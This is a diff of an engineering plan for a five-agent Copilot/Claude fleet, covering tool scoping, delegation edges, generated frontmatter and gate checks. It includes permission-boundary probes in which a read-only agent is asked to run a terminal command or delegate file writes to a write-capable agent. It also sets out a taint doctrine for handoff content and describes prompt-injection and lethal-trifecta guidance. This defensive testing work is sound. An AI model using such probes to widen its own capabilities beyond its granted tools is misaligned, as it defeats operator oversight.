 | 3 | `Run "git status" in the terminal and paste its output.` | Cannot run / no terminal tool | `tools:` omission fails **open** — read-only-by-absence is dead; reviewer/scribe must be hook-guarded instead. **STOP and amend spec Section 5.** |
-| 4 | `Delegate to the sde agent: have it create a file named scratch-probe.txt containing "hi".` | Cannot delegate (and no file appears) | `agents:` omission fails **open** — a read-only agent can spawn a `tools: all` one. **STOP.** |
+| 4 | `Delegate exactly once to the general-purpose agent: have it create scratch-probe.txt containing "hi".` | Cannot delegate; no agent event targets `general-purpose`; no file appears | `agents:`/`agent` omission fails **open** — a read-only agent can spawn a write-capable one. **STOP.** |
 
-(Assertion 4's `sde` does not exist yet — "no such agent" is itself the deny signal we want at this point; re-run assertion 4 after Task 4 to confirm the deny persists once the target exists. Record both runs.)
+(Before assertion 4, confirm `general-purpose` is a registered/available target in the runtime diagnostics or an unrestricted scratch agent. If that target is unavailable, substitute another known available non-allowlisted agent and record its name. "No such agent" is **not** a pass; the trace must prove reviewer lacked delegation rather than that the target did not exist.)
 
 - [ ] **Step 4: Pin the results into the spec.** Edit spec Section 3: replace "UNVERIFIED" framing with the verbatim `tools:` arrays that actually loaded, label each assertion `[verified]` with date + VS Code/Copilot versions, and record which model the agent actually picked (the free Phase-1 model check). While in the spec, fix two stale ledger rows the plan follows Section 4 on: the Bamboo row's "Phase 3 confirms" → Phase 2, and the merge-gate row's "severity rubric added per audit" → "severity rubric added (new content — the audit specifies no rubric)". Commit:
 
 ```bash
-git add agents/reviewer.agent.md docs/superpowers/specs/2026-07-13-copilot-fleet-redesign-design.md
+git add canonical generated plugin.json .claude-plugin/plugin.json docs/superpowers/specs/2026-07-13-copilot-fleet-redesign-design.md
 git commit -m "reviewer: first agent + the four-assertion blocking check, results pinned into the spec"
 ```
 
@@ -475,16 +513,17 @@ git commit -m "reviewer: first agent + the four-assertion blocking check, result
 ### Task 4: `sde` — the builder, on the sde-fullstack chassis
 
 **Files:**
-- Create: `agents/sde.agent.md`
+- Modify: `canonical/fleet.json`; Create: `canonical/agents/sde.md`; Generate both runtime wrappers
 
 **Interfaces:**
 - Consumes: verified vocabulary from Task 3; agent name `reviewer`.
 - Produces: agent name `sde` (consumed by sre/observer/scribe handoffs, Tasks 5–7).
 
-- [ ] **Step 1: Write `agents/sde.agent.md`.** Frontmatter:
+- [ ] **Step 1: Add `sde` canonically and write `canonical/agents/sde.md`.** Expected generated Copilot frontmatter (never edit the projection):
 
 ```yaml
 ---
+name: sde
 description: Build, fix, and refactor code and ops tooling — backend services, APIs, CLIs, automation, dashboards, web UIs — end to end with tests, in whatever language the repo uses. Absorbs test-writing. Triggers: "implement", "build", "add this feature", "fix this bug", "refactor", "write tests for this". Escalate design-before-code via eng-ladder; hand the finished diff to reviewer.
 tools: ['read', 'search', 'execute', 'edit', 'web', 'agent']
 model: ['Claude Sonnet 5 (copilot)', 'Claude Opus 4.8 (copilot)', 'GPT-5.4 (copilot)']
@@ -499,6 +538,8 @@ handoffs:
 
 `sde` enumerates all tools explicitly — after Task 3, omission means *denial*, so "all" must be spelled out. `sde` is **unguarded by design** (spec 5a): its job is running builds and tests; that is a stated trust decision, carried in the body.
 
+At this task, add the now-resolvable `reviewer → sde` handoff and `sde → reviewer` delegation/handoff. Defer only the final `sde → scribe` handoff until Task 7; the displayed block is the final Phase-1 projection.
+
 Body assembly:
 1. **Verbatim move** of the whole `C:/Users/hawkins/sde-agents/agents/sde-fullstack.md` body: `## Language neutrality` (17), `## The SRE lens — apply to everything you build` (21), `## Engineering discipline` (31 — includes the ask-the-forks and run-to-the-declared-boundary bullets), `## Full projects (multi-component)` (52), `## Process` (61), `## Verification gate — no "done" without evidence` (70 — includes the red-flags list), `## Review packet (end every task with this)` (84) + `### Worked example (the shape, compressed)` (95), `## Ladder position` (117).
 2. **EDITED during the move — the two preload-dependent passages** (the chassis assumes Claude Code `skills:` preloading, which does not exist here):
@@ -512,25 +553,26 @@ Body assembly:
 
 - [ ] **Step 2: Smoke-load in VS Code** (dropdown shows `sde`; trivial prompt answers). Re-run Task 3 assertion 4 against the now-existing `sde` from `reviewer` — the deny must persist. Record.
 
-- [ ] **Step 3: Commit** — `git add agents/sde.agent.md && git commit -m "sde: builder agent on the sde-fullstack chassis; absorbs test-engineer method + untrusted-code refusal"`
+- [ ] **Step 3: Regenerate, `--check`, and commit** — `git add canonical generated plugin.json .claude-plugin/plugin.json && git commit -m "sde: builder agent on the sde-fullstack chassis; absorbs test-engineer method + untrusted-code refusal"`
 
 ---
 
 ### Task 5: `sre` — triage and RCA, with Tier 0–3 and the trifecta named
 
 **Files:**
-- Create: `agents/sre.agent.md`
+- Modify: `canonical/fleet.json`; Create: `canonical/agents/sre.md`; Generate both runtime wrappers
 
 **Interfaces:**
 - Consumes: names `observer`, `scribe`, `sde` (Tasks 4, 6, 7 — authoring order inside Phase 1 may interleave; names are pinned here).
 - Produces: agent name `sre`; the Tier 0–3 block wording reused by Task 6 and Task 22 (production-change-gate).
 
-- [ ] **Step 1: Write `agents/sre.agent.md`.** Frontmatter:
+- [ ] **Step 1: Add `sre` canonically and write `canonical/agents/sre.md`.** Expected generated Copilot frontmatter (never edit the projection):
 
 ```yaml
 ---
+name: sre
 description: Investigate when something is wrong in production or staging — an alert fired, errors or latency spiked, a PCF app is degraded or crashing, behavior is anomalous and the cause is unknown. Owns detection-signal interpretation, triage and severity, and hypothesis-driven root cause against logs, metrics, traces, events, and network. Triggers: "why is X failing", "investigate this", "triage this alert", "what changed". Recommends mitigation; does not deploy fixes. For incident process and comms, load incident-command.
-tools: ['read', 'search', 'execute', 'web']
+tools: ['read', 'search', 'execute', 'web', 'agent']
 model: ['Claude Sonnet 5 (copilot)', 'Claude Opus 4.8 (copilot)', 'GPT-5.4 (copilot)']
 agents: ['observer', 'scribe']
 handoffs:
@@ -541,7 +583,9 @@ handoffs:
 ---
 ```
 
-The `tools:` array matches spec Section 3's table exactly — **no `agent` alias**, even though `agents:` grants delegation edges. Whether delegation *requires* an `agent` tool grant is a platform unknown: probe it during the Step-2 smoke (ask `sre` to delegate a read to `observer`). If delegation fails without the alias, add `agent` to the delegating agents (`sre`, `observer`, `sde` already has it via "all") and **record the deviation in spec Section 3** — an undeclared scope-broadening on the trifecta-holding agent is exactly what Gate C should flag.
+The generator enforces the Copilot contract: because `delegates_to` is nonempty, the projected `tools:` contains `agent` and `agents:` contains the targets. Claude receives `Agent(observer)` / `Agent(scribe)` instead. Its target list is restrictive when `sre` is the main `--agent`, but Claude currently ignores the parenthesized target list if `sre` is itself nested; record that degradation, do not claim an exact nested allowlist.
+
+`observer` and `scribe` do not exist yet, so Task 5 authors the body and non-dangling `sre → sde` handoff only. Tasks 6–7 add the displayed delegation and remaining handoff edges as their targets become real; until then the generated `sre` wrapper correctly has no delegation tool.
 
 Body assembly:
 1. **Verbatim move** from `legacy/claude-fleet/agents/sre-engineer.md`: **`## Match your altitude` (29–44) FIRST [grafted from PR #61 — 63 dropped it silently]**, retargeted at `eng-ladder`'s SRE track (responder / investigator / elite) with stack-skill names repointed per the ledger (splunk-triage→obs-logs, etc.). This is the move that satisfies Task 13's stated interface ("`sre`'s method references them"); without it the SRE tier files are dark for their primary consumer, because `eng-ladder`'s own triggers are not incident phrasings. Then `## Operating principles` (51), `## Method (triage → investigate)` (62), `## Output contract` (88), and the post-PR-#53 compromise-handling guardrails from `## Guardrails` (115) — the containment/evidence-preservation bullets move unchanged. **Two Guardrails rulings ride the move [grafted from PR #61]:** fold *"Don't declare root cause prematurely — separate what we know from what we suspect"* (118) into the moved `## Output contract`; the "Read-only on production" bullet is **superseded by Tier 0–3** (item 3) — cut it and say so in the commit.
@@ -583,24 +627,25 @@ Body assembly:
 > gap (no pool-saturation alert existed).
 ````
 
-- [ ] **Step 2: Smoke-load; commit** — `git add agents/sre.agent.md && git commit -m "sre: triage/RCA agent + Tier 0-3 change authority + the trifecta named in-body"`
+- [ ] **Step 2: Regenerate, `--check`, smoke-load each runtime, and commit** — `git add canonical generated plugin.json .claude-plugin/plugin.json && git commit -m "sre: triage/RCA agent + Tier 0-3 change authority + the trifecta named in-body"`
 
 ---
 
 ### Task 6: `observer` — obs-as-code, LGTM home
 
 **Files:**
-- Create: `agents/observer.agent.md`
+- Modify: `canonical/fleet.json`; Create: `canonical/agents/observer.md`; Generate both runtime wrappers
 
 **Interfaces:**
 - Produces: agent name `observer`; consumed by Task 38 (guarded set) and obs-skill descriptions.
 
-- [ ] **Step 1: Write `agents/observer.agent.md`.** Frontmatter:
+- [ ] **Step 1: Add `observer` canonically and write `canonical/agents/observer.md`.** Expected generated Copilot frontmatter (never edit the projection):
 
 ```yaml
 ---
+name: observer
 description: Steady-state observability work, as code — design and review Grafana dashboards, define and tune alerts, write SLIs/SLOs and track error budgets, wire telemetry pipelines (Alloy/Loki/Tempo/Mimir/Prometheus alongside Splunk/Wavefront/Moogsoft/ThousandEyes), reduce alert noise, close detection gaps after incidents. Triggers: "set up monitoring", "this alert is too noisy", "define an SLO", "what should we dashboard", "close the detection gap". For an active unknown-cause incident, hand off to sre.
-tools: ['read', 'search', 'execute', 'edit']
+tools: ['read', 'search', 'execute', 'edit', 'agent']
 model: ['Claude Sonnet 5 (copilot)', 'Claude Opus 4.8 (copilot)', 'GPT-5.4 (copilot)']
 agents: ['scribe']
 handoffs:
@@ -610,6 +655,8 @@ handoffs:
     label: Runbook for this alert
 ---
 ```
+
+At Task 6, only the `observer → sre` handoff is resolvable. Defer the displayed `observer → scribe` delegation/handoff until Task 7; the generator must not emit `agent` before that canonical delegation exists.
 
 Body assembly:
 1. **Verbatim move** from `legacy/claude-fleet/agents/sre-monitor.md`: `## Operating principles` (25), `## Method` (40), `## Output contract` (62) — striking any sentence that names Wavefront/Splunk as *the* stack (the by-signal skills own backend specifics now; the body stays signal-shaped).
@@ -649,22 +696,23 @@ Body assembly:
 > trusting the pair.
 ````
 
-- [ ] **Step 2: Smoke-load; commit** — `git add agents/observer.agent.md && git commit -m "observer: obs-as-code agent + Tier 0-3 + never-cut-the-branch"`
+- [ ] **Step 2: Regenerate, `--check`, smoke-load each runtime, and commit** — `git add canonical generated plugin.json .claude-plugin/plugin.json && git commit -m "observer: obs-as-code agent + Tier 0-3 + never-cut-the-branch"`
 
 ---
 
 ### Task 7: `scribe` — runbooks and postmortems, no execute at all
 
 **Files:**
-- Create: `agents/scribe.agent.md`
+- Modify: `canonical/fleet.json`; Create: `canonical/agents/scribe.md`; Generate both runtime wrappers
 
 **Interfaces:**
 - Produces: agent name `scribe`.
 
-- [ ] **Step 1: Write `agents/scribe.agent.md`.** Frontmatter:
+- [ ] **Step 1: Add `scribe` canonically and write `canonical/agents/scribe.md`.** Expected generated Copilot frontmatter (never edit the projection):
 
 ```yaml
 ---
+name: scribe
 description: Create and update operational runbooks and post-incident postmortems — after an incident resolves, when a paging alert has no linked runbook, when a manual procedure is tribal knowledge. Triggers: "write the runbook", "write the postmortem", "write up the incident", "document this process". Documents commands from evidence supplied to it; cannot and does not run them. For a live incident use sre; to automate instead of document, hand to sde.
 tools: ['read', 'search', 'edit']
 model: ['Claude Sonnet 5 (copilot)', 'Claude Opus 4.8 (copilot)', 'GPT-5.4 (copilot)']
@@ -675,6 +723,8 @@ handoffs:
 ```
 
 No `agents:` — scribe delegates to nobody.
+
+After adding `scribe`, activate every deferred Phase-1 edge in one canonical edit: `sde → scribe` handoff; `sre → observer, scribe` delegation and `sre → scribe` handoff; `observer → scribe` delegation/handoff; and `scribe → sde` handoff. Regenerate and compare all five final Copilot projections with the blocks in Tasks 3–7, then verify the Claude projections contain the matching `Agent(target)` grants and no handoffs.
 
 Body assembly:
 1. **Verbatim move** from `legacy/claude-fleet/agents/runbook-author.md`: **`## Pick exactly one mode` (24–31) FIRST [grafted from PR #61]** — Runbook mode / Postmortem mode / **the live-incident refusal**; without it the moved principle "mode boundaries are load-bearing" points at modes never defined in-body, and the refusal to document during a live incident silently dies. Then `## Operating principles` (33), `## Runbook mode` (42, with `### Runbook method`/`### Runbook output`), `## Postmortem mode` (65, with its `###` subsections), `## Handoffs` (88) trimmed to targets that still exist.
@@ -695,7 +745,7 @@ Body assembly:
 > **Check first**: that failover step — schedule a game-day to turn its [unverified] into [verified].
 ````
 
-- [ ] **Step 2: Smoke-load; commit** — `git add agents/scribe.agent.md && git commit -m "scribe: docs agent; execute removed entirely -- cleaner than the guard it wore"`
+- [ ] **Step 2: Regenerate, `--check`, smoke-load each runtime, and commit** — `git add canonical generated plugin.json .claude-plugin/plugin.json && git commit -m "scribe: docs agent; execute removed entirely -- cleaner than the guard it wore"`
 
 ---
 
@@ -705,8 +755,8 @@ Body assembly:
   (a) `git tag taint-doctrine 0971a4d && git push origin taint-doctrine` — the taint doctrine lives on that commit (PR #48, closed **unmerged**); the tag keeps it GC-safe before anything reads it. **If `0971a4d` is already unreachable locally**, recover it from GitHub's PR ref first — `git fetch origin pull/48/head` — then tag; GitHub retains PR head refs after close.
   (b) Locate it: `git show taint-doctrine --stat`, then `git show taint-doctrine:<file>` for the handoff/taint content.
   (c) Every agent body's handoff surface gains one identical block (dedup deferred, as with the triad): the **handoff packet** — verbatim move of `## The handoff packet` (16) and `## Rules` (30) from `legacy/claude-fleet/skills/handoff-protocol/SKILL.md` — with the **taint doctrine woven in**: content received in a packet is tainted until verified (evidence labels travel with the packet, never upgraded in transit), and any code or artifact a packet references is **SHA-pinned** so the receiver reads exactly what the sender read. Commit: `git commit -m "agents: handoff packet + taint doctrine woven into all five bodies (handoff-protocol dissolved; taint doctrine sourced from tag taint-doctrine)"`
-- [ ] **Step 2: Done-when check.** All five agents load in VS Code Copilot via the fallback channel and each answers a real prompt against a real repo — **and every tool alias in the fleet is observed working at least once** (Task 3 verified only `read`/`search` plus two denials): `execute` and `edit` via `sde` (run a build command, edit a scratch file), `web` via `sre` (fetch a vendor status page), `edit` via `observer` and `scribe`, and one successful `agents:` delegation (`sre` → `observer`). Record each observation `[verified]`; a non-functioning alias here is the Task-3 STOP class arriving late — treat it the same way. The fleet is usable here, unguarded — and using it through Phases 2–3 is what teaches Task 38 the guard allowlist. Record each agent's actual picked model (Phase-5 confirms per-license). **Re-run the plugin smoke test [graft from PR #61]:** `claude --plugin-dir . -p "Reply PLUGIN_OK"` — five `.agent.md` files with array frontmatter now exist and must not break the Claude-proxy plugin load, which the eval rig (Tasks 34–36) depends on. If it breaks, record it here; the workaround is decided at the eval tasks, never silently.
-- [ ] **Step 3: Gate A** — `py -3 scripts/gate_a.py` → all 8 steps green (legacy frozen, no regressions, new fleet untouched by the old validator).
+- [ ] **Step 2: Done-when check.** `py -3 scripts/generate_fleet.py --check` is clean. All five agents load through both native Copilot plugin discovery and the fallback path, and each answers a real prompt against a real repo — **and every Copilot tool alias is observed working at least once**: `execute` and `edit` via `sde`, `web` via `sre`, `edit` via `observer` and `scribe`, and successful delegations from `sre` and `observer` (which proves the generated `agent` tool is present). Record each channel separately `[verified]`. Then run `claude plugin validate . --strict` and smoke each generated Claude agent independently; verify Claude tool/model syntax, terminal omission of `Agent`, and record the nested target-list degradation. A Claude result is never Copilot evidence. The fleet is usable here, unguarded, and its observed Copilot commands seed Task 38.
+- [ ] **Step 3: Gate A** — `py -3 scripts/gate_a.py` → every configured step green (legacy frozen, no regressions, generated fleet current, new fleet untouched by the old validator).
 - [ ] **Step 4: Gate C** — three independent reviewers over the phase diff: one correctness, one security (the hook-execution and marketplace-`ref` decisions are workstation-security controls), one briefed only on the spec checking Section 3/5/7 conformance (delegation graph exactly as specced; no extra edges; frontmatter arrays match the pinned vocabulary). Every stack-specific claim in agent bodies labeled or flagged.
 - [ ] **Step 5: Rebase, assert, PR**
 
@@ -721,7 +771,7 @@ gh pr create --title "Phase 1: the five agents, legacy freeze, Gate B mechanized
 
 # PHASE 2 — THE SKILLS: harvest + fix (branch `phase-2-skills`)
 
-**Phase-order rule:** Task 9 (the 5d checker) lands before the first port. Every port task then follows the same discipline: copy verbatim → apply the enumerated fixes → rewrite bundled-file pointers to Markdown links (worklist given per task, from the measured inventory) → write the description with verbatim triggers → `py -3 scripts/gate_a.py` green → commit. Descriptions follow the format contract below.
+**Phase-order rule:** Task 9 (the 5d link checker) lands before the first port. Every port task then follows the same discipline: copy verbatim → apply the enumerated fixes → rewrite bundled-file pointers to Markdown links (worklist given per task, from the measured inventory) → add the skill name and exact bundled-file inventory (`references/`, `assets/`, and `scripts/`) to `canonical/fleet.json` → regenerate/`--check` → write the description with verbatim triggers → `py -3 scripts/gate_a.py` green → commit. The Task-1 production generator already rejects an unlisted runtime-visible skill directory or any missing/unexpected bundled file; Task 9 adds Markdown-link semantics before the first port, and Task 37 later consolidates both checks into validator v2. Descriptions follow the format contract below.
 
 **Description format contract (applies to every skill task in Phases 2–3):** one or two sentences of capability; then `Triggers:` with 2–4 verbatim user phrasings in quotes; then boundary clauses naming the neighbor that owns the adjacent lane (the two pinned boundaries: craft vs backend/frontend-craft; persistence.md vs database-reliability — plus data-viz vs obs-dashboards). ≤ 150 tokens. The measured-good model to imitate (3/3 discovery baseline, twice) is legacy `agent-authoring`'s description — see `legacy/claude-fleet/skills/agent-authoring/SKILL.md`.
 
@@ -745,8 +795,8 @@ Validator v2 (Task 37) owns these rules eventually; shipping the 5d slice now me
   3. **Body-link rule (strict 5d)**: every file under the skill's `references/`, `assets/`, or `scripts/` must be linked from **SKILL.md's body** — a chain-only link (an asset linked solely from a reference file) is an error, because whether VS Code follows the second hop is unverified until Task 39's chain-load probe; links from references are welcome extras, never the sole link. Skip `__pycache__`.
   Implementation notes: strip fenced code blocks before rule 1 (legacy skills carry `## `-lines and template paths inside fences — the inventory flagged blameless-postmortem, adr-template, runbook-template); treat a link whose text or target contains the path as satisfying rules 1 and 3.
 - [ ] **Step 3: Write `scripts/test_check_links.py`** — unittest over tmpdir fixtures: one fixture per rule (bad frontmatter / bad span / dead link / chain-only link) asserting the error fires, one clean fixture asserting silence, one fenced-code fixture asserting a span inside a fence does NOT fire. **Also fixture the stale-name checker (Step 4)** — its matching rules are nontrivial and an untested checker is the dead-detector class this plan condemns: one flagged word-boundary hit, one path-exempt miss (`references/safe-refactor.md`), one `.md`-suffix miss. Run: `py -3 scripts/test_check_links.py` → all pass. This is the watch-it-fail evidence for both checkers (the fixtures are the red).
-- [ ] **Step 4: Write `scripts/check_stale_names.py` — the stale-name sweep (found in plan verification: every "survives" port carries prose references to renamed/dissolved units, and no other gate sees prose).** Pure stdlib. `STALE` = the old-fleet unit names that no longer exist under those names: `sre-engineer, sde-engineer, code-reviewer, security-reviewer, test-engineer, sre-monitor, runbook-author, researcher, prompt-engineer, incident-severity, blameless-postmortem, rollback-mitigation, github-actions-ci, wavefront-queries, splunk-triage, grafana-dashboards, moogsoft-correlation, thousandeyes-network, slo-error-budget, instrument-service, api-design, ops-stack-integration, spa-architecture, ops-cli, sde-ladder, sre-ladder, tdd-workflow, safe-refactor, debug-rca, self-improve-loop, context-engineering, tool-design, handoff-protocol, route-request, adr-template, runbook-template, bamboo-to-actions-migration` — **plus the sister-repo names the SDE-sourced bodies carry [graft from PR #61's rename map]:** `sde-fullstack, homelab-platform, principal-engineer, distinguished-architect, multi-agent-architect, prompt-craft, sre-tool, service-onboard, lab-audit`, **and the literal token `sde-agents`**. Six Phase-2 skills are SDE-sourced and name those agents in spawn instructions; any site a task's enumerated edits miss would otherwise ship pointing at agents that do not exist in this fleet. Any word-boundary occurrence in `skills/`, `agents/`, `commands/` → error naming file:line — **except** matches inside a path (adjacent to `/` or immediately followed by `.md`), so `references/safe-refactor.md` links don't trip. Repoint each hit to its Disposition-ledger target (Appendix 1 is the mapping; e.g. `code-reviewer`→`reviewer`, `rollback-mitigation`→`incident-command`, `sre-ladder`→`eng-ladder`) — **renames are part of the move, not prose improvement.** Known hot spots the ports must hit: merge-gate lines 35/37/49, release-gate 24/29/51, production-change-gate 14/48, database-reliability 87/92/112, incident-severity 35/43/49/81, blameless-postmortem 60, and the moved rollback-mitigation sections 31/34/35.
-- [ ] **Step 5: Wire into Gate A** after the Gate-B tuple: `("Reference links load in VS Code (5d)", ["scripts/check_links.py"], None),` and `("No stale unit names", ["scripts/check_stale_names.py"], None),` — run `py -3 scripts/gate_a.py` → all steps green. `skills/` is empty but **`agents/` is not** — the stale-name step scans the five Phase-1 bodies retroactively; any hit is a Phase-1 leftover the preamble worklist missed — repoint it here per the ledger (that is the checker working, not a false positive). Step 3's fixtures are what proved the teeth.
+- [ ] **Step 4: Write `scripts/check_stale_names.py` — the stale-name sweep (found in plan verification: every "survives" port carries prose references to renamed/dissolved units, and no other gate sees prose).** Pure stdlib. `STALE` = the old-fleet unit names that no longer exist under those names: `sre-engineer, sde-engineer, code-reviewer, security-reviewer, test-engineer, sre-monitor, runbook-author, researcher, prompt-engineer, incident-severity, blameless-postmortem, rollback-mitigation, github-actions-ci, wavefront-queries, splunk-triage, grafana-dashboards, moogsoft-correlation, thousandeyes-network, slo-error-budget, instrument-service, api-design, ops-stack-integration, spa-architecture, ops-cli, sde-ladder, sre-ladder, tdd-workflow, safe-refactor, debug-rca, self-improve-loop, context-engineering, tool-design, handoff-protocol, route-request, adr-template, runbook-template, bamboo-to-actions-migration` — **plus the sister-repo names the SDE-sourced bodies carry [graft from PR #61's rename map]:** `sde-fullstack, homelab-platform, principal-engineer, distinguished-architect, multi-agent-architect, prompt-craft, sre-tool, service-onboard, lab-audit`, **and the literal token `sde-agents`**. Six Phase-2 skills are SDE-sourced and name those agents in spawn instructions; any site a task's enumerated edits miss would otherwise ship pointing at agents that do not exist in this fleet. Any word-boundary occurrence in `skills/`, `canonical/agents/`, or `commands/` → error naming file:line — **except** matches inside a path (adjacent to `/` or immediately followed by `.md`), so `references/safe-refactor.md` links don't trip. Generated wrappers need no duplicate scan because byte parity with canonical bodies is a separate blocking gate. Repoint each hit to its Disposition-ledger target (Appendix 1 is the mapping; e.g. `code-reviewer`→`reviewer`, `rollback-mitigation`→`incident-command`, `sre-ladder`→`eng-ladder`) — **renames are part of the move, not prose improvement.** Known hot spots the ports must hit: merge-gate lines 35/37/49, release-gate 24/29/51, production-change-gate 14/48, database-reliability 87/92/112, incident-severity 35/43/49/81, blameless-postmortem 60, and the moved rollback-mitigation sections 31/34/35.
+- [ ] **Step 5: Wire into Gate A** after the Gate-B tuple: `("Reference links load in VS Code (5d)", ["scripts/check_links.py"], None),` and `("No stale unit names", ["scripts/check_stale_names.py"], None),` — run `py -3 scripts/gate_a.py` → all steps green. `skills/` is empty but **`canonical/agents/` is not** — the stale-name step scans the five Phase-1 bodies retroactively; any hit is a Phase-1 leftover the preamble worklist missed — repoint it here per the ledger (that is the checker working, not a false positive). Step 3's fixtures are what proved the teeth.
 - [ ] **Step 6: Commit** — `git commit -m "5d + stale-name sweep mechanized: code-span pointers, dead links, orphan bundles, and dangling old-fleet names are Gate-A errors before the first port"`
 
 ---
@@ -1093,7 +1143,7 @@ Output: `[P0]`–`[P3]` findings, each with the evidence (command + output) and 
 **Files:** Create: `skills/agent-authoring/{SKILL.md,references/{artifact,roster,tools,context}.md}`, `skills/agent-security/SKILL.md`
 **Interfaces:** agent-authoring's description is the fleet's one measured-3/3 pattern — its trigger lines port verbatim.
 
-- [ ] **Step 1: agent-authoring.** SKILL.md = `SDE: skills/prompt-craft/SKILL.md` body (Method; the two rules; frontmatter quick reference **rewritten for this fleet's two artifact kinds** — `.agent.md` (Copilot custom agent: description/tools/model/agents/handoffs, the pinned vocabulary from Task 3) and `SKILL.md` (name/description/disable-model-invocation)). References, all Markdown-linked from a router: `references/artifact.md` and `references/roster.md` = verbatim from `legacy/claude-fleet/skills/agent-authoring/references/`; `references/tools.md` = body of legacy `tool-design` SKILL.md; `references/context.md` = body of legacy `context-engineering` SKILL.md. Into `roster.md`, append verbatim the fan-out cost model from `legacy/claude-fleet/skills/route-request/references/fan-out.md` (the ≈15×-tokens model and right-sizing band) and multi-agent-architect's "should this be multi-agent at all?" question as its opener. Two NEW paragraphs in SKILL.md: **personal-first, promote-by-PR** (*"Build new agents/skills in `~/.copilot/{agents,skills}` — per-user, zero-risk. When a second person wants one, it graduates into the fleet by PR (CONTRIBUTING is the policy; this skill is the method)."*) and **compose with the fleet** (*"Prefer wiring a new skill into an existing agent's lane over minting a new agent; a new agent is justified only by a distinct tool scope."*)
+- [ ] **Step 1: agent-authoring.** SKILL.md = `SDE: skills/prompt-craft/SKILL.md` body (Method; the two rules; frontmatter quick reference **rewritten for this fleet's authoring and projection surfaces** — canonical `fleet.json` agent entry + body, generated Copilot `.agent.md`, generated Claude `.md`, and shared `SKILL.md`; generated wrappers are examples to inspect, never edit targets). The runtime reference documents Copilot `description/tools/model/agents/handoffs` separately from Claude `description/tools/model`, including `Agent(target)` and namespaced plugin skills. References, all Markdown-linked from a router: `references/artifact.md` and `references/roster.md` = verbatim from `legacy/claude-fleet/skills/agent-authoring/references/`; `references/tools.md` = body of legacy `tool-design` SKILL.md; `references/context.md` = body of legacy `context-engineering` SKILL.md. Into `roster.md`, append verbatim the fan-out cost model from `legacy/claude-fleet/skills/route-request/references/fan-out.md` (the ≈15×-tokens model and right-sizing band) and multi-agent-architect's "should this be multi-agent at all?" question as its opener. Two NEW paragraphs in SKILL.md: **personal-first, promote-by-PR** (*"Build new agents/skills in `~/.copilot/{agents,skills}` — per-user, zero-risk. When a second person wants one, it graduates into the fleet by PR (CONTRIBUTING is the policy; this skill is the method)."*) and **compose with the fleet** (*"Prefer wiring a new skill into an existing agent's lane over minting a new agent; a new agent is justified only by a distinct tool scope."*)
   **Description — keep ALL TEN measured trigger phrasings [graft from PR #61; 63's draft silently dropped five of them, from the fleet's one description with a measured 3/3 discovery baseline]:** *"Use when creating or fixing anything an LLM consumes — a prompt, an agent definition, a SKILL.md, a tool description, or a grader — or when designing the roster they live in. Triggers: 'write me an agent/skill/prompt', 'my skill never triggers', 'it fires on almost every request', 'how do I rewrite this description', 'the model keeps ignoring this instruction', 'the output is the wrong shape', 'should this be an agent or a skill', 'should we split this into subagents', 'what orchestration shape', 'our agents duplicate work / lose context between handoffs'. Personal-first: build in ~/.copilot, promote by PR."* Measure it (`wc -c`) against the ≤150-token bar and trim boundary prose, never triggers, if it overruns. **Because the surrounding prose changed, this description is re-baselined in Task 36 rather than assumed to carry the old 3/3** — that keeps the no-baseline-no-edit rule honest.
 - [ ] **Step 2: agent-security.** Body from `legacy/claude-fleet/skills/agent-security/SKILL.md`: keep `## The lethal trifecta` (17), `## Designing safe agent/tool integrations` (117), `## Output` (131), `## Handoffs` (135, retargeted to fleet names). **Drop `## How this fleet already contains it (and where to be careful)` (28–116) — the per-agent census rotted once already (audit Tier 4); anti-rot doctrine: point at `tools:` frontmatter, don't transcribe it.** NEW section `## Tool-scope containment (Copilot-native)`: *"The primary control is `tools:` omission — an agent whose frontmatter omits `execute`/`edit` cannot run or write, by absence, not promise. Break the trifecta by dropping one leg: no `web` on agents that read untrusted content with secrets in reach; no `agents:` edges from read-only agents to write-capable ones (delegation is not isolation). To audit an agent, read its frontmatter and this fleet's hooks/ — never a prose census, which rots."* Description: legacy base + *"Triggers: 'is this agent safe', 'review this agent's blast radius', 'prompt injection', 'my agent reads webhooks/PRs/logs'. Ships because teammates build their own agents."*
 - [ ] **Step 3:** Gate A green; commit — `git commit -m "agent-authoring rebuilt on the prompt-craft method (absorbs tool-design, context-engineering, fan-out cost model); agent-security rewritten Copilot-native, census dropped for frontmatter-pointing"`
@@ -1285,7 +1335,7 @@ to catch.
 
 ### Task 33: Phase 3 close — the fleet is content-complete
 
-- [ ] **Step 1: Ledger sweep (the completeness gate).** Walk BOTH appendices of the spec row by row against the tree: every one of the 37 old skills, 9 old agents, and every machinery/asset/root-doc row has its disposition realized or explicitly scheduled (machinery rows → Phase 4/5 task numbers). Count check: `ls skills/ | wc -l` = 26; `ls agents/` = 5 `.agent.md`; `pcf-deploy` + `service-onboarding` are the only two `disable-model-invocation` skills. Record the sweep as a table in the PR body — nothing is dropped by silence.
+- [ ] **Step 1: Ledger sweep (the completeness gate).** Walk BOTH appendices of the spec row by row against the tree: every one of the 37 old skills, 9 old agents, and every machinery/asset/root-doc row has its disposition realized or explicitly scheduled (machinery rows → Phase 4/5 task numbers). Count check: `ls skills/ | wc -l` = 26; `ls canonical/agents/` = 5 bodies; `ls generated/copilot/agents/*.agent.md` = 5; `ls generated/claude/agents/*.md` = 5; `pcf-deploy` + `service-onboarding` are the only two `disable-model-invocation` skills. Record the sweep as a table in the PR body — nothing is dropped by silence.
 - [ ] **Step 2: Gate A** green (all six Tier-2 assertion families now exercised against real ported content: 2.1 pcf-deploy, 2.2 obs-metrics, 2.3 obs-logs, 2.4 obs-alerting, 2.5 ci-actions, 2.6 obs-dashboards).
 - [ ] **Step 3: Gate C** — three reviewers; conformance reviewer checks the by-signal structure against Section 4's table (six skills, references as specced, boundaries stated both sides) and audits evidence labels on every query in every reference (the fabricated-WQL class — this is the review that owns invented stack facts).
 - [ ] **Step 4: Rebase, assert, PR.** Gate D runs immediately after this merges — Phase 4 opens with its instruments (plan-level decision, see File Structure).
@@ -1308,10 +1358,10 @@ to catch.
 - Produces: the canary set Section 8's "0 dark skills" bar is measured against (Gate D, Tasks 36/48), and the behavioral regression suite (gate blocking, injection refusal, handoff taint). Case ids follow `discover-<skill>` — graders and reports key on them.
 
 - [ ] **Step 1: Delete all 45 old cases** (`git rm evals/discovery/*.yaml`) — every one names an old unit; the 2 `disable-model-invocation` cases were unpassable by construction (audit Tier 3). Recoverable from git.
